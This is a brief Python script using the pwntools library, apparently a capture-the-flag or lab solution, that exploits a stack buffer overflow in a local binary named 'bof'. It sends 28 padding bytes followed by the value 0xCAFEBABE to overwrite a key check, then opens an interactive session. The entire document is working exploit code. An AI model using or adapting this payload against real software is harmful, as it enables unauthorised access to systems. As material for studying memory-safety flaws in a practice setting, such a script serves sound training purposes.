from pwn import *

p = process('./bof')

payload = b'a' * 28
payload += p64(0xCAFEBABE)

p.sendafter(b'The key is: ', payload)

p.interactive()

